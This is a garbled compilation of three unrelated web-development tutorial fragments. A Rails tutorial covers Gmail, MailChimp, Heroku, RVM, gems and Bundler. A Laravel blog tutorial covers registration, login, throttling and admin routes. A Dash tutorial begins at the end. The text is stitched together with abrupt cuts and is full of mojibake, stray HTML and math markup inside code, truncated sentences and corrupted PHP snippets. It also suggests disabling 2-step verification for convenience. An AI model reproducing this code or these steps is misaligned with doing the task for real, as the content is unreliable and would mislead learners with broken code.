â¢ set up an application-specific password
â¢ turn off 2-step verification
â¢ create a new Gmail account for use with this tutorial

Other services, such as Mandrill, can be used to send email from the application. Or you can connect directly to an SMTP mail server to send email. The tutorial wonât show the details but Iâll provide links for more information if you donât want to use Gmail.

MailChimp

This tutorial shows how website visitors can sign up to receive a newsletter provided by a MailChimp mailing list. MailChimp allows you to send up to 12,000 emails/month to a list of 2000 or fewer subscribers for free. There is no cost to set up an account. After you have set up a MailChimp account, create a new mailing list where you can collect email addresses of visitors who have asked to subscribe to a newsletter. The MailChimp âListsâ page has a button for âCreate List.â The list name and other details are up to you. If you get frustrated with the complex and confusing MailChimp interface, try to remember that the friendly MailChimp monkey is laughing with you, not at you. Heroku
Weâll use Heroku to host the tutorial application so anyone can reach it.

To deploy an app to Heroku, you must have a Heroku account. Visit https://id.heroku.com/signup/devcenter to set up an account. Be sure to use the same email address you used to register for GitHub. Itâs very important that you use the same email address for GitHub and Heroku accounts.

# Installation

Installing Rails on Windows is frustrating and painful. Readers and workshop students often tell me that theyâve given up on learning Rails because installation of Ruby on Windows is difficult and introduces bugs or creates configuration issues. Even when you succeed in getting Rails to run on Windows, you will encounter gems you cannot install. For these reasons, I urge you to use Nitrous.io, a browser-based development environment, on your Windows laptop.

Text Editor

Youâll need a text editor for writing code and editing files. I recommend Sublime Text 2 for Mac OS X, Windows, or Linux. Word processing programs, such as Microsoft Word, will not work because they introduce hidden formatting codes into text files. Programmersâ text editors, such as Sublime Text, provide syntax highlighting, making software code more readable and programmers more productive. Simple text editors such as TextEdit for Mac OS X, or WordPad for Microsoft Windows, provide no syntax highlighting
and should be avoided.

If you donât have a text editor, install Sublime Text now. You can find tutorials for Sublime Text on YouTube. It is not practical to explain how to set up and use a text editor in this short book, so use the instructions youâll find elsewhere.

You Donât Need an IDE

Programmers who come to Rails from other platforms, such as Java or C++, often ask for recommendations for an IDE, or an integrated development environment. These are software applications that combine a text editor with built-in tools such as a debugger. Some Rails developers use JetBrains RubyMine, Aptana Studio, or Komodo but most Rails developers use only a text editor and terminal application. You donât need an IDE unless youâre in the habit of using one. For a beginner, they are cumbersome and add little additional value.

Terminal 

Youâll need an application called a console or terminal emulator to run programs from your computerâs command line. We call the command line the shell because it is the outer layer of the operating systemâs internal mechanisms (which we call the kernel). On Mac OS X, you can use the Terminal application. Experienced developers often upgrade to the more powerful iTerm2 application.

Getting Fancy With the Prompt

If you watch experienced developers at work, you may see their consoles are colorful, with lots of information shown in the prompt. Youâll see Git status, current directory, and RVM gemset or Ruby version. Many developers replace the standard Bash shell with the Z shell and Oh-my-zsh. You donât have to install the Z shell to get a fancy prompt; the Bash-it utility is easy to install and gives you much of the functionality. A fancy prompt is helpful but requires some Unix skills to install. Donât worry about getting fancy now; you can try it down the road.

Installing Ruby

Your first challenge in learning Rails is installing Ruby on your computer. Frankly, this can be the most difficult step in learning Rails because no tutorial can sort out the specific configuration of your computer. Get over this hump and everything else becomes easy. The focus of this book is learning Rails, not installing Ruby, so to keep the book short and readable, Iâm going to give you links to articles that will help you install Ruby.

Ruby Version Manager (RVM)

I promised that this book would introduce you to the practices of professional Rails developers. One of the most important utilities youâll need in setting up a real-world Rails development environment is RVM, the Ruby Version Manager. RVM lets you switch between different versions of Ruby. Right now, that might not seem important, but as soon as a new version of Ruby is released, youâll need to upgrade, and it is
best to be ready by installing the current version of Ruby with RVM, so you can easily add a new version of Ruby later, and still switch back to older versions as needed. RVM also helps you manage your collections of gems, by letting you create multiple gemsets. Each gemset is the collection of gems you need for a specific project. Rails changes frequently; with RVM, you can install a specific version of Rails in a project gemset, along with all the gems you need for the project. When a new version of Rails is released, you can create a new gemset with the new Rails version when you start a new project. Your old project will still have the version of Rails it needs in its own gemset.

If youâve followed the instructions in the article Installing Rails and installed RVM, youâll be
ready to handle multiple versions of Ruby, and multiple versions of Rails. Thatâs as it should be. Most professional Rails developers have more than one version of Ruby or Rails, and RVM makes it easy to switch. RVM will show you a list of available Ruby versions:</code></pre>
<pre class="r"><code>$ rvm list</code></pre>
<p>You can see a list of available gemsets associated with the current Ruby version:</p>
<pre class="r"><code>$ rvm gemset list</code></pre>
<p>You will see an arrow that shows which gemset is active. You will see a global gemset as well as any others you have created, such as a gemset for Rails4.0.1 .</p>
<p>Hereâs how to switch between gemsets:</p>
<pre class="r"><code>$ rvm gemset use global</code></pre>
<p>And switch back to another:</p>
<pre class="r"><code>$ rvm gemset use default</code></pre>
<p>After youâve worked on a few Rails applications, youâll see several project-specific gemsets if you are using RVM in the way most developers do. RVM is not the only utility you can use to manage multiple Ruby versions. Some developers like Chruby, rbenv, or others. Donât be worried if you hear debates about RVM versus Chruby or rbenv; developers love to compare the merits of their tools. RVM is popular, wellsupported, and an excellent utility to help a developer install Ruby and manage gemsets; thatâs why we use it.</p>
<p>Project-Specific Gemset</p>
<p>For our learn-rails application, weâll create a project-specific gemset using RVM. Weâll give gemset the same name as our application. By creating a gemset for our tutorial application, weâll isolate the current version of Rails and the gems we need for this project. Whether you use RVM or another Ruby version manager, this will introduce you to the idea of âsandboxingâ (isolating) your development environment so you can avoid conflicts among projects.</p>
<p>After we create the project-specific gemset, weâll install the Rails gem into the gemset. Enter these commands:</p>
<pre class="r"><code>$ rvm use ruby-2.0.0@learn-rails --create
$ gem install rails</code></pre>
<p>The newest Rails version will be installed. Itâs absolutely necessary to create a gemset and install Rails so we can move on to creating the application in the next chapter. If you have trouble at this point, refer to the article Installing Rails or the RVM website. Linux users may need to check instructions for Integrating RVM.</p>
<p>Letâs make sure Rails is ready to run. Open a terminal and type:</p>
<pre class="r"><code>$ rails -v</code></pre>
<p>You should see the message âRails 4.0.1â (or something similar).</p>
<p>Note</p>
<p>Donât feel shy about copying code; itâs how you will learn. Working programmers spend a lot of time copying code from others. At first, you will copy a lot of code. As you gain proficiency, you will copy code and adapt it, more extensively as you gain confidence and skill. Only when youâve been working fulltime as a coder for months or years will you find code from scratch; even then, when you encounter new problems, you will still look for code examples to copy and adapt.</p>

<div id="starter-applications" class="section level2">
<h2>Starter Applications</h2>
<p>Rails provides a framework; that is, a software library that provides utilities, conventions, and organizing principles to allow us to build complex web applications. Without a framework, weâd have to code everything from scratch. Rails gives us the basics we need for many websites.</p>
<p>Still, the framework doesnât give us all the features we need for many common types of websites. For example, we might want users to register for an account and log in to access the website (âuser management and authenticationâ). We might want to restrict portions of our website to just administrators (âauthorizationâ). We also might want to add gems that enhance Rails to aid development (gems for testing, for example) or improve the look and feel of our application (Twitter Bootstrap). Developers often mix and match components to make a customized Rails stack. Developers often use a starter application instead of assembling an application from scratch.</p>
<p>You might call this a âtemplateâ but we use that term to refer to the view files that combine HTML with Ruby code to generate web pages. Most experienced developers have one or more starter applications that save time when beginning a new project. The RailsApps project was launched to provide open source starter applications so developers could collaborate on their starter applications and avoid duplicated effort. After you gain some skill with this tutorial, you might use the RailsApps starter apps to instantly generate a Rails application with features like authentication, authorization, and an attractive design. For now, weâll begin with the Rails default starter application.</p>
<p>To create the Rails default starter application, type:</p>
<pre class="r"><code>$ rails new learn-rails</code></pre>
<p>This will create a new Rails application named âlearn-rails.â</p>
<p>The rails new command will create nine folders and 53 files. It will install 44 gems into your gemset. After you create the application, switch to its folder to continue work directly in the application:</p>
<pre class="r"><code>$ cd learn-rails</code></pre>
<p>This is your project directory. It is also called the application root directory</p>
<p>Checking files in our newly installed directory</p>
<pre class="r"><code>$ ls -1pa
./
../
.gitignore
.ruby-gemset
.ruby-version
Gemfile
Gemfile.lock
README.rdoc
Rakefile
app/
bin/
config/
config.ru
db/
lib/
log/
public/
tmp/
vendor/</code></pre>
<p>Test the Application</p>
<p>Youâve created a simple default web application. Itâs ready to run. Launching the Web Server. You can launch the application by entering the command:</p>
<pre class="r"><code>$ rails server</code></pre>
<p>Alternatively, to save typing, you can abbreviate the <code>rails server</code> command:</p>
<pre class="r"><code>$ rails s</code></pre>
<p>Youâll see</p>
<pre class="r"><code>Youâll see:
=&gt; Booting WEBrick
=&gt; Rails 4.0.1 application starting in development on http://0.0.0.0:3000
=&gt; Run `rails server -h` for more startup options
=&gt; Ctrl-C to shutdown server

[...] INFO ruby 2.0.0 (2013-02-24) [x86_64-darwin12.2.0]
[...] INFO WEBrick::HTTPServer#start: pid=38534 port=3000</code></pre>
<p>The <code>rails server</code> command launches the default WEBrick web server that is provided with Ruby</p>
<p>Viewing in the Web Browser</p>
<hr />
<p>To see your application in action, open a web browser window and navigate to <code>http://localhost:3000/.</code> Youâll see the Rails default information page.</p>
<p>Watching Log Messages: Notice that messages scroll in the console window when your browser requests the Rail default web page. Open the file log/development.log and youâll see the same messages. When a browser sends requests to the WEBrick web server, diagnostic messages are written to the console and to the <code>log/development.log</code> file. These diagnostic messages are an important tool for troubleshooting when you are developing. You can keep more than one terminal window open. For convenience, you may want to keep a terminal window open for running the web server and watching diagnostic messages. In the Terminal or iTerm2 applications, Command-t opens additional console sessions in new âtabs.â</p>
<p>Stopping the Web Server</p>
<hr />
<p>You can stop the server with Control-c to return to the command prompt. Most of the time youâll keep the web server running as you add or edit files in your project. Changes will automatically appear when you refresh the browser or request a new page. There is a tricky exception, however. If you make changes to the Gemfile, or changes to configuration files, the web server must be shut down and relaunched for changes to be activated. As a rule of thumb, files that produce web pages can be changed without a restart. This includes any file in the app/ folder which creates web pages, as well as the <code>config/routes.rb</code> file. Changes to files that create the environment for the web application, such as <code>gems</code> or configuration files, and are loaded at web server launch, wonât be seen until the web server is restarted.</p>

<div id="gems" class="section level2">
<h2>Gems</h2>
<p>The art of selecting gems is at the heart of Rails development. I explained earlier that gems are packages of code, âsoftware libraries,â that have been developed and tested by other developers. Some gems add functionality or features to a website. Other gems play a supporting role, making development easier or implementing basic infrastructure. Gems are open source. They are available at no charge and can be freely copied and modified. It is a mark of honor to release a gem for public use, and a developerâs reputation can be established when a gem becomes popular and widely used. Gems are often created when a developer has used the same code as a component in more than one web application. He or she will take time to release the code as a gem. Thatâs how the Rails ecosystem was built, gem by gem since 2004. There is no evaluation or review process in publishing gems. Gems are hosted on a public server, rubygems.org. Gems are mostly text files (like any other Ruby code), organized in a particular format with some descriptive information (in a gemspec file), and compressed and archived as a single file. A single command, gem push , uploads a gem to the rubygems.org server for anyone to use.</p>
<p>Over 50,000 gems have been released since rubygems.org was established. Some of these gems are used by one or two developers on their own projects. Many others have been neglected and abandoned due to lack of interest. Only a few thousand gems are popular and widely used. As a Rails developer, you must master the art of finding and evaluating gems so you can base your applications on the tried-and-true work of others. There is no single authoritative source of recommendations for gems. The Ruby Toolbox website categorizes and ranks many gems by popularity, and it is a good place to begin hunting for useful gems. Other than that, it is useful to study example applications and search for blog posts to find which gems are most often recommended. When you find an interesting gem, search Stack Overflow or Google to see what people are saying. Look at the gemâs GitHub repository and check:</p>
<p>â¢ How many issues are open? How many are closed? â¢ How recent are the commits of patches or updates? â¢ Is there a CHANGELOG file? â¢ Is the gem well-documented? â¢ How many âstarsâ (people watching) or âforksâ (people hacking)?</p>
<p>Popular gems are likely to have many reported issues, some of which are trivial problems or feature requests. Gems that are actively maintained will have many closed issues and, ideally, only a few open issues. When you find a gem that has many open issues and no recently closed issues, youâve probably found a gem that has been abandoned. Also look at the commit log, which youâll find on the GitHub project page in a tab at the top of the page. Regular and recent activity in the commit log indicates the gem is actively maintained.</p>
<p>Rails Gems</p>
<p>Rails itself is a gem that, in turn, requires a collection of other gems. This becomes clear if you look at the summary page for Rails on the rubygems.org site. On that page, youâll see photos of the Rails core team. More importantly, youâll see a list of gems that are required to use Rails:</p>

<p>These are the âruntime dependenciesâ for Rails. Each of these gems has its own dependencies as well. When you install Rails, a total of 44 gems are automatically installed in your development environment.</p>
<p>Gems for a Rails Default Application</p>
<p>In addition to the Rails gem and its dependencies, a handful of other gems are included in every rails new default starter application:</p>

</tbody>
</table>
<p>You may not need a SQLite database, SCSS for stylesheets, jQuery or the others, but many developers use these tools so they are included in the default starter application. Where Do Gems Live? When you run a Rails application, gems are loaded into the computerâs working memory immediately before your own custom code is loaded. Gems are handled by the Ruby interpreter no differently than your own code. Itâs all Ruby code, whether you or someone else wrote it. When you are building an application in Rails, you donât need to think about where gems are stored in your file system. If youâre a curious person, though, you might wonder where the gems live. Run the gem which command and youâll see:</p>
<pre class="r"><code>$ gem which bundler
/Users/me/.rvm/gems/ruby-2.0.0-p0@global/gems/bundler-1.3.5/lib/bundler.rb</code></pre>
<pre class="r"><code>$ gem which rails
/Users/me/.rvm/gems/ruby-2.0.0-p0@learn-rails/gems/railties-4.0.1/lib/rails.rb</code></pre>
<p>Gems: are files saved to the computerâs disk storage. If you use RVM, they are saved to a hidden .rvm folder in your user directory. A global subfolder contains the Bundler gem. If youâve followed the instructions in the âGet Startedâ chapter to install Rails, the projectspecific learn-rails subfolder contains the Rails gem. If you use Chruby or Rbenv instead of RVM, your gems will be stored in a different location. Youâll never move or delete gems directly. Instead youâll manage gems using the Bundler utility. The key to Bundler is the Gemfile.</p>
<p>Gemfile: Every Rails application has a Gemfile. Earlier, I described Rails from the viewpoint of the âgem hunter,â the developer who wants to assemble an application from the best open source components he or she can find. To the gem hunter, the Gemfile is the most important file in the application. It lists each gem that the developer wants to use. The Gemfile provides the information needed by the Bundler utility to manage gems. Bundlerâs bundle install command reads the Gemfile, then downloads and saves each listed gem to the hidden gem folder. Bundler checks to see if the gem is already installed and only downloads gems that are needed. Bundler checks for the newest gem version and records the version number in the Gemfile.lock file. Bundler also downloads any gem dependencies and records the dependencies in the Gemfile.lock file. Between the Gemfile, with its list of gems that will be used by the application, and the Gemfile.lock file, with its list of dependencies and version numbers, you have a complete specification of every gem required to run the application. More importantly, when other developers install your application, Bundler will automatically install all the gems (including dependencies and correct versions) needed to run the application. When you deploy the application to production for others to use, automated deployment scripts (such as those used by Heroku) install all the required gems. Bundler provides a bundle update command when we want to replace any gems with newer versions. If you run bundle update , any new gem versions will be downloaded and installed and the Gemfile.lock file will be updated. Be aware that updating gems can break your application, so only update gems when you have time to test and resolve any issues. You can run bundle outdated to see which gems are available in newer versions. If you want to prevent your fellow developers (or yourself) from accidentally updating gems, you can specify a gem version number for any gem in the Gemfile. The Gemfile gives fine-grained control over rules for updating:</p>

group :development do
gem &#39;better_errors&#39;
gem &#39;quiet_assets&#39;
gem &#39;rails_layout&#39;
end</code></pre>
<p>Notice that weâve placed the better_errors and quiet_assets gems inside a âgroup.â Specifying a group for development or testing ensures a gem is not loaded in production, reducing the applicationâs memory footprint. Rails let you specify groups for development, test, or production. Each time you edit the Gemfile, run bundle install and restar</p>
<p>Install the Gems</p>
<p>Youâve edited the Gemfile. Install the required gems on your computer:</p>
<pre class="r"><code>$ bundle install</code></pre>
<p>The bundle install command will download the gems from the rubygems.org server and save them to a hidden directory that is managed by the RVM gemset youâve specified. Weâll see all the gems and their dependencies:</p>
<pre class="r"><code>Fetching gem metadata from https://rubygems.org/........
Fetching gem metadata from https://rubygems.org/..
Resolving dependencies...
Using rake (10.0.4)
Using i18n (0.6.4)
Installing minitest (4.7.4)
.
.
.
(many more gems not shown... you get the idea)
.
.
.
Your bundle is complete!</code></pre>
<p>Use <code>bundle show [gemname]</code> to see where a bundled gem is installed.</p>
<p>You can use your text editor to view the contents of Gemfile.lock and you will see a detailed listing of every gem and each dependency, with version numbers. Thereâs no reason to edit a Gemfile.lock file; if it is ever in error, delete it and run bundle install to recreate it. Run gem list to see all the gems that are loaded into the development environment:</p>
<p>$ gem list</p>
<p>The list of gems loaded in the environment is the same as the list specified in the Gemfile.lock file. Hereâs how it works. RVM makes a place for the gems to be stored (the RVM gemset); the Gemfile lists the gems you want to use; bundle install reads the Gemfile and installs the gems into the RVM gemset; the Gemfile.lock file records dependencies and version numbers; and gem list shows you the gems that are in the gemset and available for use.</p>
<p>Configure</p>
<p>Rails is known for its âconvention over configurationâ guiding principle. As applied, the principle reduces the need for many configuration files. Itâs not possible to eliminate all configuration files, however. Many applications require configuration of settings such as email account credentials or API keys for external services.</p>
<p>Configure Email</p>
<p>Email messages are visible in the console and the log file when you test the application. If you donât want to actually send email, you can skip this step. But itâs more fun when your application can actually send email. You can learn more in the article Send Email with Rails.</p>
<p>Connect to an Email Server</p>
<p>Web servers donât send email. Our Rails application has to connect to an email server (also known as a mail transfer agent or âmail relayâ). In the early days of the Internet, an experienced system adminstrator could set up an SMTP server to distribute email. Now, because of efforts to reduce spam, it is necessary to use an established email service to ensure deliverability. For convenience during development, you can use your own Gmail account. In production, for high volume transactional email and improved deliverability, itâs best to use a service such as Mandrill or Mailgun. See the article Send Email with Rails. We need to configure Rails so the application can connect with an email server. For our tutorial application, weâll connect to Gmail to send email. In the file config/environments/development.rb, near the end of the file, find the statement:</p>
<pre class="r"><code>config.assets.debug = true</code></pre>

<p>BUILDING A BLOG APPLICATION WITH LARAVEL</p>
<p>What will we build? Our simple blog application will have these features: â¢ Users can be able to register and login. â¢ Admin can write posts. â¢ Users can be able to comment on the posts. â¢ There is an admin control panel to manage users, posts (create, update, delete) â¢ Permissions and roles system. â¢ Admin can create/remove/edit categories.</p>
<p>Letâs get started!</p>
<p>Building a user registration page</p>
<p>Since Laravel 5, implementing authentication has become very easy, Laravel has provided almost everything for us. In this section, you will learn how to create a simple registration page. First, we need to create some routes. Open routes.php and add these routes:</p>
<pre class="r"><code>Route::get(&#39;users/register&#39;, &#39;Auth\AuthController@getRegister&#39;);
Route::post(&#39;users/register&#39;, &#39;Auth\AuthController@postRegister&#39;);</code></pre>
<p>The first route will provide the registration form. The second route will process the form. Both routes are handled by the AuthControllerâs actions: getRegister and postRegister. By default, Laravel has created the AuthController for us. You can find it in the Auth directory. Letâs open the file and take a look at:</p>
<pre class="r"><code>protected function validator(array $data)
{
return Validator::make($data, [
&#39;name&#39; =&gt; &#39;required|max:255&#39;,
&#39;email&#39; =&gt; &#39;required|email|max:255|unique:users&#39;,
&#39;password&#39; =&gt; &#39;required|confirmed|min:6&#39;,
]);
}</code></pre>
<p>As you may notice, there are three fields here: name, email and password. When users visit users/register, this AuthController will render a registration view, which contains a registration form.</p>
<p>Unfortunately, Laravel doesnât create the registration view for us, we have to create it manually. The registration views should be placed at <code>resources/views/auth/register.blade.php.</code></p>
<p>Here is the code:</p>
<pre class="r"><code>@extends(&#39;master&#39;)
@section(&#39;name&#39;, &#39;Register&#39;)
@section(&#39;content&#39;)
  &lt;div class=&quot;container col-md-6 col-md-offset-3&quot;&gt;
    &lt;div class=&quot;well well bs-component&quot;&gt;
      &lt;form class=&quot;form-horizontal&quot; method=&quot;post&quot;&gt;
        @foreach ($errors-&gt;all() as $error)
        &lt;p class=&quot;alert alert-danger&quot;&gt;{{ $error }}&lt;/p&gt;
@endforeach
    {!! csrf_field() !!}
&lt;fieldset&gt;
  &lt;legend&gt;Register an account&lt;/legend&gt;
    &lt;div class=&quot;form-group&quot;&gt;
      &lt;label for=&quot;name&quot; class=&quot;col-lg-2 control-label&quot;&gt;Name&lt;/label&gt;
      &lt;div class=&quot;col-lg-10&quot;&gt;
        &lt;input type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;name&quot; placeholder=&quot;Name&quot; name=&quot;name&quot; value=&quot;{{ old(&#39;name&#39;) }}&quot;&gt;
      &lt;/div&gt;
    &lt;/div&gt;
    &lt;div class=&quot;form-group&quot;&gt;
      &lt;label for=&quot;email&quot; class=&quot;col-lg-2 control-label&quot;&gt;Email&lt;/label&gt;
      &lt;div class=&quot;col-lg-10&quot;&gt;
        &lt;input type=&quot;email&quot; class=&quot;form-control&quot; id=&quot;email&quot; placeholder=&quot;Email&quot; name=&quot;email&quot; value=&quot;{{ old(&#39;email&#39;) }}&quot;&gt;
      &lt;/div&gt;
    &lt;/div&gt;
    &lt;div class=&quot;form-group&quot;&gt;
      &lt;label for=&quot;password&quot; class=&quot;col-lg-2 control-label&quot;&gt;Password&lt;/label&gt;
      &lt;div class=&quot;col-lg-10&quot;&gt;
        &lt;input type=&quot;password&quot; class=&quot;form-control&quot; name=&quot;password&quot;&gt;
      &lt;/div&gt;
    &lt;/div&gt;
    &lt;div class=&quot;form-group&quot;&gt;
      &lt;label for=&quot;password&quot; class=&quot;col-lg-2 control-label&quot;&gt;Confirm password&lt;/label&gt;
      &lt;div class=&quot;col-lg-10&quot;&gt;
      &lt;input type=&quot;password&quot; class=&quot;form-control&quot; name=&quot;password_confirmation&quot;&gt;
      &lt;/div&gt;
    &lt;/div&gt;
    &lt;div class=&quot;form-group&quot;&gt;
      &lt;div class=&quot;col-lg-10 col-lg-offset-2&quot;&gt;
        &lt;button type=&quot;reset&quot; class=&quot;btn btn-default&quot;&gt;Cancel&lt;/button&gt;
        &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;Submit&lt;/button&gt;
      &lt;/div&gt;
    &lt;/div&gt;
&lt;/fieldset&gt;
&lt;/form&gt;
&lt;/div&gt;
&lt;/div&gt;

<p>Youâve created many forms in the previous chapters, so I guess you should understand this file clearly. Here is a new tip. Instead of using this line to generate a new CSRF token:</p>
<p><input type="hidden" name="_token" value="{!! csrf_token() !!}"></p>
<p>You can simply use this helper function to generate the token!</p>
<p>{!! csrf_field() !!}</p>
<p>You also may notice that there is a new old() method. When the formâs validation fails, the users will be redirected back to the form. We use this method to display the old usersâ input, so they donât have to fill in all the fields again. Now, go to <a href="http://homestead.app/users/register" class="uri">http://homestead.app/users/register</a>, you should see a nice user registration form.</p>
<p>Fill in all the fields, and hit submit! Youâve registered a new user! Check your database now, you should see:</p>
<p>By default, Laravel automatically redirects you to the /home URI. If you see this error when youâre at <a href="http://homestead.app/home" class="uri">http://homestead.app/home</a>: NotFoundHttpException in RouteCollection.php line 161:</p>
<p>Then that means your routes.php file doesnât have the home route:</p>
<p>Route::get(âhomeâ, â<a href="mailto:PagesController@home">PagesController@home</a>â);</p>
<p>You can fix this error by adding the home route into your app or you may simply ignore it. Youâll learn how to redirect users to other locations in the next section.</p>
<p>Creating a logout functionality When users register for a new account, Laravel will validate the registration form. If the validation rules pass, Laravel will save data to the database, log the users in and redirect them to the /home URI of our application (home page). To redirect users to other locations, open AuthController.php, find:</p>
use AuthenticatesAndRegistersUsers; and add this line below: protected $redirectPath = â/yourPathâ; You may notice that when you go to the registration page, Laravel will automatically redirect you back to the home page because youâre now logged in. Note: In Laravel 5.2, the $redirectPath variable has been changed to $redirectTo. We donât have the logout functionality yet, but donât worry, itâs very easy to implement. Open the shared/navbar.blade.php view, find:
<li>
<a href="/users/register">Register</a>
</li>
<li>
<a href="/users/login">Login</a>
</li>
Replace with the following code: <span class="citation">@if</span> (Auth::check())
<li>
<a href="/users/logout">Logout</a>
</li>
<span class="citation">@else</span>
<li>
<a href="/users/register">Register</a>
</li>
<li>
<a href="/users/login">Login</a>
</li>
<p><span class="citation">@endif</span> To check whether a user is logged in, we can use the Auth::check() method. In the code above, if users are logged in, we will display a logout link.</p>
<p>To make the link work, open routes.php, add: Route::get(âusers/logoutâ, âAuth<span class="citation">@getLogout</span>â); If youâre using Laravel 5.2, open your AuthController, update the constructor (aka construct method) as follows:</p>
<p>public function __construct() { $this-&gt;middleware(âguestâ, [âexceptâ =&gt; [âlogoutâ, âgetLogoutâ]]); } As you see, when users visit the users/logout link, we will use AuthControllerâs getLogout action to log the users out.</p>
<p>Try to test the functionality yourself ! Now you can be able to log out</p>
Creating a login page Itâs time to create our login form. As always, weâre going to define two different actions on the users/login route: Route::get(âusers/loginâ, âAuth<span class="citation">@getLogin</span>â); Route::post(âusers/loginâ, âAuth<span class="citation">@postLogin</span>â); The GET route will display the login form, the POST route will process the form. As you may have guessed, you should create a login view now. The view should be placed at views/auth/login.blade.php. <span class="citation">@extends</span>(âmasterâ) <span class="citation">@section</span>(ânameâ, âLoginâ) <span class="citation">@section</span>(âcontentâ)

</div>
<p><span class="citation">@endsection</span> Our login form is simple, it has two fields: email and password. Users have to enter the correct email and password here to login. Laravel also provides the remember me functionality out of the box. We can implement it by simply creating a remember checkbox. Note: The name of the checkbox should be ârememberâ. Well done. Now letâs go to <a href="http://homestead.app/users/login" class="uri">http://homestead.app/users/login</a> and try to login with your email and password!</p>
<p>If you try to login with a wrong information, you may encounter this error:</p>
<p>By default, Laravel use auth/login route to authenticate users, and users will be redirected to that route if they enter wrong credentials. However, we use users/login route, so we need to let Laravel know that by opening the AuthController class and adding a loginPath property: protected $loginPath = â/users/loginâ; Now everything should be working fine. Add authentication throttling to your application Laravel 5.1.4 introduces a new feature: âAuthentication Throttlingâ. This feature is used to throttle login attempts to your application. If users try to login many times, they canât be able to login for one minute.</p>
<p>Note: If youâre using Laravel 5.1.4 or newer, this feature has been implemented already. You may skip these steps. By the way, Itâs still good to know how it works. As weâre using the AuthController class for authentication, you can easily integrate this feature by doing the following steps: First, be sure to update your application to version 5.1.4 or newer. You can update your application by vagrant ssh to your VM, then cd to your Laravel root directory, and run:</p>
<pre class="r"><code>composer update</code></pre>
<p>Once updated, open AuthController.php file and find</p>
<p>use App; Add below: use Illuminate; Find: use AuthenticatesAndRegistersUsers; Modify to: use AuthenticatesAndRegistersUsers, ThrottlesLogins; Done! Youâve implemented the throttling feature. Now, letâs try to login with wrong credentials;</p>
<p>When you try to login many times, there would be an error message:</p>
<p>Building an admin area Imagine that our application will have an administration section and a front end section, there would be many routes. We need to find a way to organize all the routes. Additionally, we may want to allow only administrators to access our admin area. Fortunately, Laravel helps us to do that easily. Letâs open routes.php file and add:</p>
<p>Route::group(array(âprefixâ =&gt; âadminâ, ânamespaceâ =&gt; âAdminâ, âmiddlewareâ =&gt;<br />
âauthâ), function () { Route::get(âusersâ, â<a href="mailto:UsersController@index">UsersController@index</a>â); }); By using Route::group we can group all related routes together and apply some specific rules for them. âprefixâ =&gt; âadminâ We use the prefix attribute to prefix each route in the route group with a URI (admin). In this case, when we go to <a href="http://homestead.app/admin" class="uri">http://homestead.app/admin</a> or any routes that contain the admin prefix, Laravel will understand that we want to access the admin area. Laravel 5.1 uses PSR-2 autoloading standard, which is a coding style. Your applications controllers, models and other classes must be namespaced. What are namespaces? According to PHP docs: ânamespaces are designed to solve two problems that authors of libraries and applications encounter when creating re-usable code elements such as classes or functions.â. Simply put, letâs think namespaces as the last names of persons. When many persons have the same name, we will use their last name to distinguish them apart. To namespace a class, we can use the namespace keyword and declare the namespace at the top of the file before any other code. For instance, letâs open AuthController.php class, you should see its namespace: <?php
namespace App\Http\Controllers\Auth;
You can learn more about Namespace here:
http://php.net/manual/en/language.namespaces.rationale.php
As you may have seen, I have defined a namespace called Admin for our routes:
'namespace' => âAdminâ If we have a class that has a namespace like this: <?php
namespace App\Http\Controllers\Admin;
Laravel will know exactly which class that we want to load and where to find it.
Laravel 5 also has a new feature called HTTP Middleware (or simply Middleware). Basically, we
use it to filter our applicationsâ HTTP requests. For example, I use:


'middleware' => âauthâ That means I want to use the auth middeware for this route group. Only authenticated users can access these routes. Weâll learn more about Middleware soon. List all users We now have a route group for our admin control panel. Letâs list all the users so that we can view and manage them easier. As you know, we have defined a route here: Route::get(âusersâ, â<a href="mailto:UsersController@index">UsersController@index</a>â); We donât have the UsersController yet, letâs use PHP Artisan to create it: php artisan make:controller Admin/UsersController This time, our code is a little bit different. It has /Admin before the controllerâs name. Laravel is clever. When we code like this, it will automatically create a directory called Admin, and put the UsersController file into the Admin directory for you. More than that, our controller has been namespaced!</p>
<p>At this point, I think that youâve known how to list all the users. Basically, the process is very similar to what weâve done to list all the tickets in Chapter 3. First, we tell Laravel that we want to use the User model: Find</p>
use App; Add below: use App; Now, update the index() action as follows: public function index() { <span class="math inline">\(users = User::all(); return view(&#39;backend.users.index&#39;, compact(&#39;users&#39;)); } As you may have guessed, we will put all the administration views in the backend directory. Weâre going to create a new view called index.blade.php to display all the users. Letâs create a new users directory as well and put the index view inside. So the index view will be placed at views/backend/users/index.blade.php. Here is the code: @extends(&#39;master&#39;) @section(&#39;title&#39;, &#39;All users&#39;) @section(&#39;content&#39;) &lt;div class=&quot;container col-md-8 col-md-offset-2&quot;&gt; &lt;div class=&quot;panel panel-default&quot;&gt; &lt;div class=&quot;panel-heading&quot;&gt; &lt;h2&gt; All users &lt;/h2&gt; &lt;/div&gt; @if (session(&#39;status&#39;)) &lt;div class=&quot;alert alert-success&quot;&gt; {{ session(&#39;status&#39;) }} &lt;/div&gt; @endif @if (\)</span>users-&gt;isEmpty())
<p>
There is no user.

<p>Dash for Beginners Learn how to build dashboards in Python using Dash. Dash is Python framework for building web applications. It built on top of Flask, Plotly.js, React and React Js. It enables you to build dashboards using pure Python. Dash is open source, and its apps run on the web browser. In this tutorial, we introduce the reader to Dash fundamentals and assume that they have prior experience with Plotly.</p>
<p>Dash Installation</p>
<p>In order to start using Dash, we have to install several packages.</p>
<p>The core dash backend. Dash front-end Dash HTML components Dash core components Plotly pip install dash==0.21.1<br />
pip install dash-renderer==0.13.0<br />
pip install dash-html-components==0.11.0 pip install dash-core-components==0.23.0<br />
pip install plotly âupgrade Dash App Layout</p>
<p>A Dash application is usually composed of two parts. The first part is the layout and describes how the app will look like and the second part describes the interactivity of the application. Dash provides HTML classes that enable us to generate HTML content with Python. To use these classes, we need to import dash_core_components and dash_html_components. You can also create your own custom components using Javascript and React Js.</p>
<p>To kick us off we shall create a file called app.py using our favorite text editor then import these packages.</p>
